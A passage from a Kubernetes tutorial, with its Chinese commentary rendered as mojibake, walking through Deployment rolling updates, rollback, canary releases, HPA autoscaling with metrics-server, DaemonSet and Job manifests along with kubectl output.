updated\n\n# è§å¯åçº§è¿ç¨\n[root@k8s-master01 ~]#  kubectl get pods -n dev -w\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-5d89bdfbf9-65qcw   1/1     Running   0          31s\npc-deployment-5d89bdfbf9-w5nzv   1/1     Running   0          31s\npc-deployment-5d89bdfbf9-xpt7w   1/1     Running   0          31s\n\npc-deployment-5d89bdfbf9-xpt7w   1/1     Terminating   0          41s\npc-deployment-5d89bdfbf9-65qcw   1/1     Terminating   0          41s\npc-deployment-5d89bdfbf9-w5nzv   1/1     Terminating   0          41s\n\npc-deployment-675d469f8b-grn8z   0/1     Pending       0          0s\npc-deployment-675d469f8b-hbl4v   0/1     Pending       0          0s\npc-deployment-675d469f8b-67nz2   0/1     Pending       0          0s\n\npc-deployment-675d469f8b-grn8z   0/1     ContainerCreating   0          0s\npc-deployment-675d469f8b-hbl4v   0/1     ContainerCreating   0          0s\npc-deployment-675d469f8b-67nz2   0/1     ContainerCreating   0          0s\n\npc-deployment-675d469f8b-grn8z   1/1     Running             0          1s\npc-deployment-675d469f8b-67nz2   1/1     Running             0          1s\npc-deployment-675d469f8b-hbl4v   1/1     Running             0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\næ»å¨æ´æ°\n1. ç¼è¾ pc-deployment.yaml, å¨ spec èç¹ä¸æ·»å æ´æ°ç­ç¥\n\nspec:\n  strategy: # ç­ç¥\n    type: RollingUpdate # æ»å¨æ´æ°ç­ç¥\n    rollingUpdate:\n      maxSurge: 25% \n      maxUnavailable: 25%\n\n\n1\n2\n3\n4\n5\n6\n\n\n2. åå»º deploy è¿è¡éªè¯\n\n# åæ´éå\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.3 -n dev \ndeployment.apps/pc-deployment image updated\n\n# è§å¯åçº§è¿ç¨\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME                           READY   STATUS    RESTARTS   AGE\npc-deployment-c848d767-8rbzt   1/1     Running   0          31m\npc-deployment-c848d767-h4p68   1/1     Running   0          31m\npc-deployment-c848d767-hlmz4   1/1     Running   0          31m\npc-deployment-c848d767-rrqcn   1/1     Running   0          31m\n\npc-deployment-966bf7f44-226rx   0/1     Pending             0          0s\npc-deployment-966bf7f44-226rx   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-226rx   1/1     Running             0          1s\npc-deployment-c848d767-h4p68    0/1     Terminating         0          34m\n\npc-deployment-966bf7f44-cnd44   0/1     Pending             0          0s\npc-deployment-966bf7f44-cnd44   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-cnd44   1/1     Running             0          2s\npc-deployment-c848d767-hlmz4    0/1     Terminating         0          34m\n\npc-deployment-966bf7f44-px48p   0/1     Pending             0          0s\npc-deployment-966bf7f44-px48p   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-px48p   1/1     Running             0          0s\npc-deployment-c848d767-8rbzt    0/1     Terminating         0          34m\n\npc-deployment-966bf7f44-dkmqp   0/1     Pending             0          0s\npc-deployment-966bf7f44-dkmqp   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-dkmqp   1/1     Running             0          2s\npc-deployment-c848d767-rrqcn    0/1     Terminating         0          34m\n\n# è³æ­¤ï¼æ°çæ¬çpodåå»ºå®æ¯ï¼å°±çæ¬çpodéæ¯å®æ¯\n# ä¸­é´è¿ç¨æ¯æ»å¨è¿è¡çï¼ä¹å°±æ¯è¾¹éæ¯è¾¹åå»º\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\næ»å¨æ´æ°çè¿ç¨ï¼\n\n\n\néåæ´æ°ä¸­ rs çååï¼å¯ä»¥å¨åå»ºéåå¾æ¶åå  --recode åæ°ï¼æå©äºè®°å½åå»ºè¿ç¨ç­ã\n\n# æ¥çrs,åç°åæ¥çrsçä¾æ§å­å¨ï¼åªæ¯podæ°éåä¸ºäº0ï¼èååæ°äº§çäºä¸ä¸ªrsï¼podæ°éä¸º4\n# å¶å®è¿å°±æ¯deploymentè½å¤è¿è¡çæ¬åéçå¥¥å¦æå¨ï¼åé¢ä¼è¯¦ç»è§£é\n[root@k8s-master01 ~]# kubectl get rs -n dev\nNAME                       DESIRED   CURRENT   READY   AGE\npc-deployment-6696798b78   0         0         0       7m37s\npc-deployment-6696798b11   0         0         0       5m37s\npc-deployment-c848d76789   4         4         4       72s\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nçæ¬åé\ndeployment æ¯æçæ¬åçº§è¿ç¨ä¸­çæåãç»§ç»­åè½ä»¥åçæ¬åéç­è¯¸å¤åè½ï¼ä¸é¢å·ä½æ¥ç.\n\nkubectl rolloutï¼ çæ¬åçº§ç¸å³åè½ï¼æ¯æä¸é¢çéé¡¹ï¼\n\n * status æ¾ç¤ºå½ååçº§ç¶æ\n * history æ¾ç¤º åçº§åå²è®°å½\n * pause æåçæ¬åçº§è¿ç¨\n * resume ç»§ç»­å·²ç»æåççæ¬åçº§è¿ç¨\n * restart éå¯çæ¬åçº§è¿ç¨\n * undo åæ»å°ä¸ä¸çº§çæ¬ï¼å¯ä»¥ä½¿ç¨ --to-revision åæ»å°æå®çæ¬ï¼\n\n# æ¥çå½ååçº§çæ¬çç¶æ\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev\ndeployment "pc-deployment" successfully rolled out\n\n# æ¥çåçº§åå²è®°å½\n[root@k8s-master01 ~]# kubectl rollout history deploy pc-deployment -n dev\ndeployment.apps/pc-deployment\nREVISION  CHANGE-CAUSE\n1         kubectl create --filename=pc-deployment.yaml --record=true\n2         kubectl create --filename=pc-deployment.yaml --record=true\n3         kubectl create --filename=pc-deployment.yaml --record=true\n# å¯ä»¥åç°æä¸æ¬¡çæ¬è®°å½ï¼è¯´æå®æè¿ä¸¤æ¬¡åçº§\n\n# çæ¬åæ»\n# è¿éç´æ¥ä½¿ç¨--to-revision=1åæ»å°äº1çæ¬ï¼ å¦æçç¥è¿ä¸ªéé¡¹ï¼å°±æ¯åéå°ä¸ä¸ªçæ¬ï¼å°±æ¯2çæ¬\n[root@k8s-master01 ~]# kubectl rollout undo deployment pc-deployment --to-revision=1 -n dev\ndeployment.apps/pc-deployment rolled back\n\n# æ¥çåç°ï¼éè¿nginxéåçæ¬å¯ä»¥åç°å°äºç¬¬ä¸ç\n[root@k8s-master01 ~]# kubectl get deploy -n dev -o wide\nNAME            READY   UP-TO-DATE   AVAILABLE   AGE   CONTAINERS   IMAGES         \npc-deployment   4/4     4            4           74m   nginx        nginx:1.17.1   \n\n# æ¥çrsï¼åç°ç¬¬ä¸ä¸ªrsä¸­æ4ä¸ªpodè¿è¡ï¼åé¢ä¸¤ä¸ªçæ¬çrsä¸­podä¸ºè¿è¡\n# å¶å®deploymentä¹æä»¥å¯æ¯å®ç°çæ¬çåæ»ï¼å°±æ¯éè¿è®°å½ä¸åå²rsæ¥å®ç°çï¼\n# ä¸æ¦æ³åæ»å°åªä¸ªçæ¬ï¼åªéè¦å°å½åçæ¬podæ°ééä¸º0ï¼ç¶åå°åæ»çæ¬çpodæåä¸ºç®æ æ°éå°±å¯ä»¥äº\n[root@k8s-master01 ~]# kubectl get rs -n dev\nNAME                       DESIRED   CURRENT   READY   AGE\npc-deployment-6696798b78   4         4         4       78m\npc-deployment-966bf7f44    0         0         0       37m\npc-deployment-c848d767     0         0         0       71m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\néä¸éåå¸\nDeployment æ§å¶å¨æ¯ææ§å¶æ´æ°è¿ç¨ä¸­çæ§å¶ï¼å¦ âæå (pause)â æ âç»§ç»­ (resume)â æ´æ°æä½ã\n\næ¯å¦æä¸æ¹æ°ç Pod èµæºåå»ºå®æåç«å³æåæ´æ°è¿ç¨ï¼æ­¤æ¶ï¼ä»å­å¨ä¸é¨åæ°çæ¬çåºç¨ï¼ä¸»ä½é¨åè¿æ¯æ§ççæ¬ãç¶åï¼åç­éä¸å°é¨åçç¨æ·è¯·æ±è·¯ç±å°æ°çæ¬ç Pod åºç¨ï¼ç»§ç»­è§å¯è½å¦ç¨³å®å°æææçæ¹å¼è¿è¡ãç¡®å®æ²¡é®é¢ä¹ååç»§ç»­å®æä½ä¸ç Pod èµæºæ»å¨æ´æ°ï¼å¦åç«å³åæ»æ´æ°æä½ãè¿å°±æ¯æè°çéä¸éåå¸ã\n\n# æ´æ°deploymentççæ¬ï¼å¹¶éç½®æådeployment\n[root@k8s-master01 ~]#  kubectl set image deploy pc-deployment nginx=nginx:1.17.4 -n dev && kubectl rollout pause deployment pc-deployment  -n dev\ndeployment.apps/pc-deployment image updated\ndeployment.apps/pc-deployment paused\n\n#è§å¯æ´æ°ç¶æ\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n devã\nWaiting for deployment "pc-deployment" rollout to finish: 2 out of 4 new replicas have been updated...\n\n# çæ§æ´æ°çè¿ç¨ï¼å¯ä»¥çå°å·²ç»æ°å¢äºä¸ä¸ªèµæºï¼ä½æ¯å¹¶æªæç§é¢æçç¶æå»å é¤ä¸ä¸ªæ§çèµæºï¼å°±æ¯å ä¸ºä½¿ç¨äºpauseæåå½ä»¤\n\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                       DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES         \npc-deployment-5d89bdfbf9   3         3         3       19m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       14m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   2         2         2       3m16s   nginx        nginx:1.17.4   \n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-5d89bdfbf9-rj8sq   1/1     Running   0          7m33s\npc-deployment-5d89bdfbf9-ttwgg   1/1     Running   0          7m35s\npc-deployment-5d89bdfbf9-v4wvc   1/1     Running   0          7m34s\npc-deployment-6c9f56fcfb-996rt   1/1     Running   0          3m31s\npc-deployment-6c9f56fcfb-j2gtj   1/1     Running   0          3m31s\n\n# ç¡®ä¿æ´æ°çpodæ²¡é®é¢äºï¼ç»§ç»­æ´æ°\n[root@k8s-master01 ~]# kubectl rollout resume deploy pc-deployment -n dev\ndeployment.apps/pc-deployment resumed\n\n# æ¥çæåçæ´æ°æåµ\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                       DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES         \npc-deployment-5d89bdfbf9   0         0         0       21m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       16m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   4         4         4       5m11s   nginx        nginx:1.17.4   \n\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6c9f56fcfb-7bfwh   1/1     Running   0          37s\npc-deployment-6c9f56fcfb-996rt   1/1     Running   0          5m27s\npc-deployment-6c9f56fcfb-j2gtj   1/1     Running   0          5m27s\npc-deployment-6c9f56fcfb-rf84v   1/1     Running   0          37s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nå é¤ Deployment\n\n# å é¤deploymentï¼å¶ä¸çrsåpodä¹å°è¢«å é¤\n[root@k8s-master01 ~]# kubectl delete -f pc-deployment.yaml\ndeployment.apps "pc-deployment" deleted\n\n\n1\n2\n3\n\n\n\n# Horizontal Pod Autoscaler(HPA)\n\nå¨åé¢çè¯¾ç¨ä¸­ï¼æä»¬å·²ç»å¯ä»¥å®ç°éè¿æå·¥æ§è¡ kubectl scale å½ä»¤å®ç° Pod æ©å®¹æç¼©å®¹ï¼ä½æ¯è¿æ¾ç¶ä¸ç¬¦å Kubernetes çå®ä½ç®æ  -- èªå¨åãæºè½åã Kubernetes ææå¯ä»¥å®ç°éè¿çæµ Pod çä½¿ç¨æåµï¼å®ç° pod æ°éçèªå¨è°æ´ï¼äºæ¯å°±äº§çäº Horizontal Pod Autoscalerï¼HPAï¼è¿ç§æ§å¶å¨ã\n\nHPA å¯ä»¥è·åæ¯ä¸ª Pod å©ç¨çï¼ç¶åå HPA ä¸­å®ä¹çææ è¿è¡å¯¹æ¯ï¼åæ¶è®¡ç®åºéè¦ä¼¸ç¼©çå·ä½å¼ï¼æåå®ç° Pod çæ°éçè°æ´ãå¶å® HPA ä¸ä¹åç Deployment ä¸æ ·ï¼ä¹å±äºä¸ç§ Kubernetes èµæºå¯¹è±¡ï¼å®éè¿è¿½è¸ªåæ RC æ§å¶çææç®æ  Pod çè´è½½ååæåµï¼æ¥ç¡®å®æ¯å¦éè¦éå¯¹æ§å°è°æ´ç®æ  Pod çå¯æ¬æ°ï¼è¿æ¯ HPA çå®ç°åçã\n\n\n\n1 å®è£ metrics-server\nmetrics-server å¯ä»¥ç¨æ¥æ¶ééç¾¤ä¸­çèµæºä½¿ç¨æåµ\n\n# å®è£git\n[root@k8s-master01 ~]# yum install git -y\n# è·åmetrics-server, æ³¨æä½¿ç¨ççæ¬\n[root@k8s-master01 ~]# git clone -b v0.3.6 https://github.com/kubernetes-incubator/metrics-server\n# ä¿®æ¹deployment, æ³¨æä¿®æ¹çæ¯éåååå§ååæ°\n[root@k8s-master01 ~]# cd /root/metrics-server/deploy/1.8+/\n[root@k8s-master01 1.8+]# vim metrics-server-deployment.yaml\næå¾ä¸­æ·»å ä¸é¢éé¡¹\nhostNetwork: true\nimage: registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6\nargs:\n- --kubelet-insecure-tls\n- --kubelet-preferred-address-types=InternalIP,Hostname,InternalDNS,ExternalDNS,ExternalIP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n\n# å®è£metrics-server\n[root@k8s-master01 1.8+]# kubectl apply -f ./\n\n# æ¥çpodè¿è¡æåµ\n[root@k8s-master01 1.8+]# kubectl get pod -n kube-system\nmetrics-server-6b976979db-2xwbj   1/1     Running   0          90s\n\n# ä½¿ç¨kubectl top node æ¥çèµæºä½¿ç¨æåµ\n[root@k8s-master01 1.8+]# kubectl top node\nNAME           CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%\nk8s-master01   289m         14%    1582Mi          54%       \nk8s-node01     81m          4%     1195Mi          40%       \nk8s-node02     72m          3%     1211Mi          41%  \n[root@k8s-master01 1.8+]# kubectl top pod -n kube-system\nNAME                              CPU(cores)   MEMORY(bytes)\ncoredns-6955765f44-7ptsb          3m           9Mi\ncoredns-6955765f44-vcwr5          3m           8Mi\netcd-master                       14m          145Mi\n...\n# è³æ­¤,metrics-serverå®è£å®æ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n2 åå¤ deployment å servie\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  strategy: # ç­ç¥\n    type: RollingUpdate # æ»å¨æ´æ°ç­ç¥\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        resources: # èµæºéé¢\n          limits:  # éå¶èµæºï¼ä¸éï¼\n            cpu: "1" # CPUéå¶ï¼åä½æ¯coreæ°\n          requests: # è¯·æ±èµæºï¼ä¸éï¼\n            cpu: "100m"  # CPUéå¶ï¼åä½æ¯coreæ°\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# åå»ºservice\n[root@k8s-master01 1.8+]# kubectl expose deployment nginx --type=NodePort --port=80 -n dev\n\n\n1\n2\n\n\n# æ¥ç\n[root@k8s-master01 1.8+]# kubectl get deployment,pod,svc -n dev\nNAME                    READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/nginx   1/1     1            1           47s\n\nNAME                         READY   STATUS    RESTARTS   AGE\npod/nginx-7df9756ccc-bh8dr   1/1     Running   0          47s\n\nNAME            TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE\nservice/nginx   NodePort   10.101.18.29   <none>        80:31830/TCP   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n3 é¨ç½² HPA\nåå»º pc-hpa.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: autoscaling/v1\nkind: HorizontalPodAutoscaler\nmetadata:\n  name: pc-hpa\n  namespace: dev\nspec:\n  minReplicas: 1  #æå°podæ°é\n  maxReplicas: 10 #æå¤§podæ°é\n  targetCPUUtilizationPercentage: 3 # CPUä½¿ç¨çææ ï¼3%ï¼\n  scaleTargetRef:   # æå®è¦æ§å¶çnginxä¿¡æ¯\n    apiVersion: apps/v1\n    kind: Deployment\n    name: nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºhpa\n[root@k8s-master01 1.8+]# kubectl create -f pc-hpa.yaml\nhorizontalpodautoscaler.autoscaling/pc-hpa created\n\n# æ¥çhpa\n    [root@k8s-master01 1.8+]# kubectl get hpa -n dev\nNAME     REFERENCE          TARGETS   MINPODS   MAXPODS   REPLICAS   AGE\npc-hpa   Deployment/nginx   0%/3%     1         10        1          62s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n4 æµè¯\nä½¿ç¨åæµå·¥å·å¯¹ service å°å 192.168.5.4:31830 è¿è¡åæµï¼ç¶åéè¿æ§å¶å°æ¥ç hpa å pod çåå\nhpa åå\n\n[root@k8s-master01 ~]# kubectl get hpa -n dev -w\nNAME   REFERENCE      TARGETS  MINPODS  MAXPODS  REPLICAS  AGE\npc-hpa  Deployment/nginx  0%/3%   1     10     1      4m11s\npc-hpa  Deployment/nginx  0%/3%   1     10     1      5m19s\npc-hpa  Deployment/nginx  22%/3%   1     10     1      6m50s\npc-hpa  Deployment/nginx  22%/3%   1     10     4      7m5s\npc-hpa  Deployment/nginx  22%/3%   1     10     8      7m21s\npc-hpa  Deployment/nginx  6%/3%   1     10     8      7m51s\npc-hpa  Deployment/nginx  0%/3%   1     10     8      9m6s\npc-hpa  Deployment/nginx  0%/3%   1     10     8      13m\npc-hpa  Deployment/nginx  0%/3%   1     10     1      14m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\ndeployment åå\n\n[root@k8s-master01 ~]# kubectl get deployment -n dev -w\nNAME    READY   UP-TO-DATE   AVAILABLE   AGE\nnginx   1/1     1            1           11m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     4            1           13m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     8            1           14m\nnginx   2/8     8            2           14m\nnginx   3/8     8            3           14m\nnginx   4/8     8            4           14m\nnginx   5/8     8            5           14m\nnginx   6/8     8            6           14m\nnginx   7/8     8            7           14m\nnginx   8/8     8            8           15m\nnginx   8/1     8            8           20m\nnginx   8/1     8            8           20m\nnginx   1/1     1            1           20m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\npod åå\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME                     READY   STATUS    RESTARTS   AGE\nnginx-7df9756ccc-bh8dr   1/1     Running   0          11m\nnginx-7df9756ccc-cpgrv   0/1     Pending   0          0s\nnginx-7df9756ccc-8zhwk   0/1     Pending   0          0s\nnginx-7df9756ccc-rr9bn   0/1     Pending   0          0s\nnginx-7df9756ccc-cpgrv   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-8zhwk   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-rr9bn   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     Pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     Pending             0          0s\nnginx-7df9756ccc-sl9c6   0/1     Pending             0          0s\nnginx-7df9756ccc-fgst7   0/1     Pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-sl9c6   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-fgst7   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-8zhwk   1/1     Running             0          19s\nnginx-7df9756ccc-rr9bn   1/1     Running             0          30s\nnginx-7df9756ccc-m9gsj   1/1     Running             0          21s\nnginx-7df9756ccc-cpgrv   1/1     Running             0          47s\nnginx-7df9756ccc-sl9c6   1/1     Running             0          33s\nnginx-7df9756ccc-g56qb   1/1     Running             0          48s\nnginx-7df9756ccc-fgst7   1/1     Running             0          66s\nnginx-7df9756ccc-fgst7   1/1     Terminating         0          6m50s\nnginx-7df9756ccc-8zhwk   1/1     Terminating         0          7m5s\nnginx-7df9756ccc-cpgrv   1/1     Terminating         0          7m5s\nnginx-7df9756ccc-g56qb   1/1     Terminating         0          6m50s\nnginx-7df9756ccc-rr9bn   1/1     Terminating         0          7m5s\nnginx-7df9756ccc-m9gsj   1/1     Terminating         0          6m50s\nnginx-7df9756ccc-sl9c6   1/1     Terminating         0          6m50s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# DaemonSet(DS)\n\nDaemonSet ç±»åçæ§å¶å¨å¯ä»¥ä¿è¯å¨éç¾¤ä¸­çæ¯ä¸å°ï¼ææå®ï¼èç¹ä¸é½è¿è¡ä¸ä¸ªå¯æ¬ãä¸è¬éç¨äºæ¥å¿æ¶éãèç¹çæ§ç­åºæ¯ãä¹å°±æ¯è¯´ï¼å¦æä¸ä¸ª Pod æä¾çåè½æ¯èç¹çº§å«çï¼æ¯ä¸ªèç¹é½éè¦ä¸åªéè¦ä¸ä¸ªï¼ï¼é£ä¹è¿ç±» Pod å°±éåä½¿ç¨ DaemonSet ç±»åçæ§å¶å¨åå»ºã\n\n\n\nDaemonSet æ§å¶å¨çç¹ç¹ï¼\n\n * æ¯å½åéç¾¤ä¸­æ·»å ä¸ä¸ªèç¹æ¶ï¼æå®ç Pod å¯æ¬ä¹å°æ·»å å°è¯¥èç¹ä¸\n * å½èç¹ä»éç¾¤ä¸­ç§»é¤æ¶ï¼Pod ä¹å°±è¢«åå¾åæ¶äº\n\nä¸é¢åæ¥çä¸ DaemonSet çèµæºæ¸åæä»¶\n\napiVersion: apps/v1 # çæ¬å·\nkind: DaemonSet # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: daemonset\nspec: # è¯¦ææè¿°\n  revisionHistoryLimit: 3 # ä¿çåå²çæ¬\n  updateStrategy: # æ´æ°ç­ç¥\n    type: RollingUpdate # æ»å¨æ´æ°ç­ç¥\n    rollingUpdate: # æ»å¨æ´æ°\n      maxUnavailable: 1 # æå¤§ä¸å¯ç¨ç¶æç Pod çæå¤§å¼ï¼å¯ä»¥ä¸ºç¾åæ¯ï¼ä¹å¯ä»¥ä¸ºæ´æ°\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchLabels:      # Labelså¹éè§å\n      app: nginx-pod\n    matchExpressions: # Expressionså¹éè§å\n      - {key: app, operator: In, values: [nginx-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nåå»º pc-daemonset.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: apps/v1\nkind: DaemonSet      \nmetadata:\n  name: pc-daemonset\n  namespace: dev\nspec: \n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# åå»ºdaemonset\n[root@k8s-master01 ~]# kubectl create -f  pc-daemonset.yaml\ndaemonset.apps/pc-daemonset created\n\n# æ¥çdaemonset\n[root@k8s-master01 ~]#  kubectl get ds -n dev -o wide\nNAME        DESIRED  CURRENT  READY  UP-TO-DATE  AVAILABLE   AGE   CONTAINERS   IMAGES         \npc-daemonset   2        2        2      2           2        24s   nginx        nginx:1.17.1   \n\n# æ¥çpod,åç°å¨æ¯ä¸ªNodeä¸é½è¿è¡ä¸ä¸ªpod\n[root@k8s-master01 ~]#  kubectl get pods -n dev -o wide\nNAME                 READY   STATUS    RESTARTS   AGE   IP            NODE    \npc-daemonset-9bck8   1/1     Running   0          37s   10.244.1.43   node1     \npc-daemonset-k224w   1/1     Running   0          37s   10.244.2.74   node2      \n\n# å é¤daemonset\n[root@k8s-master01 ~]# kubectl delete -f pc-daemonset.yaml\ndaemonset.apps "pc-daemonset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# Job\n\nJobï¼ä¸»è¦ç¨äºè´è´£ ** æ¹éå¤ç (ä¸æ¬¡è¦å¤çæå®æ°éä»»å¡) ç­æçä¸æ¬¡æ§ (æ¯ä¸ªä»»å¡ä»è¿è¡ä¸æ¬¡å°±ç»æ)** ä»»å¡ãJob ç¹ç¹å¦ä¸ï¼\n\n * å½ Job åå»ºç pod æ§è¡æåç»ææ¶ï¼Job å°è®°å½æåç»æç pod æ°é\n * å½æåç»æç pod è¾¾å°æå®çæ°éæ¶ï¼Job å°å®ææ§è¡\n\n\n\nJob çèµæºæ¸åæä»¶ï¼\n\napiVersion: batch/v1 # çæ¬å·\nkind: Job # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: job\nspec: # è¯¦ææè¿°\n  completions: 1 # æå®jobéè¦æåè¿è¡Podsçæ¬¡æ°ãé»è®¤å¼: 1\n  parallelism: 1 # æå®jobå¨ä»»ä¸æ¶å»åºè¯¥å¹¶åè¿è¡Podsçæ°éãé»è®¤å¼: 1\n  activeDeadlineSeconds: 30 # æå®jobå¯è¿è¡çæ¶é´æéï¼è¶è¿æ¶é´è¿æªç»æï¼ç³»ç»å°ä¼å°è¯è¿è¡ç»æ­¢ã\n  backoffLimit: 6 # æå®jobå¤±è´¥åè¿è¡éè¯çæ¬¡æ°ãé»è®¤æ¯6\n  manualSelector: true # æ¯å¦å¯ä»¥ä½¿ç¨selectoréæ©å¨éæ©podï¼é»è®¤æ¯false\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchLabels:      # Labelså¹éè§å\n      app: counter-pod\n    matchExpressions: # Expressionså¹éè§å\n      - {key: app, operator: In, values: [counter-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartPolicy: Never # éå¯ç­ç¥åªè½è®¾ç½®ä¸ºNeveræèOnFailure\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 2;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n> å³äºéå¯ç­ç¥è®¾ç½®çè¯´æï¼\n> å¦ææå®ä¸º OnFailureï¼å job ä¼å¨ pod åºç°æéæ¶éå¯å®¹å¨ï¼èä¸æ¯åå»º podï¼failed æ¬¡æ°ä¸å\n> å¦ææå®ä¸º Neverï¼å job ä¼å¨ pod åºç°æéæ¶åå»ºæ°ç podï¼å¹¶ä¸æé pod ä¸ä¼æ¶å¤±ï¼ä¹ä¸ä¼éå¯ï¼failed æ¬¡æ°å  1\n> å¦ææå®ä¸º Always çè¯ï¼å°±æå³çä¸ç´éå¯ï¼æå³ç job ä»»å¡ä¼éå¤å»æ§è¡äºï¼å½ç¶ä¸å¯¹ï¼æä»¥ä¸è½è®¾ç½®ä¸º Always\n\nåå»º pc-job.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: batch/v1\nkind: Job      \nmetadata:\n  name: pc-job\n  namespace: dev\nspec:\n  manualSelector: true\n  selector:\n    matchLabels:\n      app: counter-pod\n  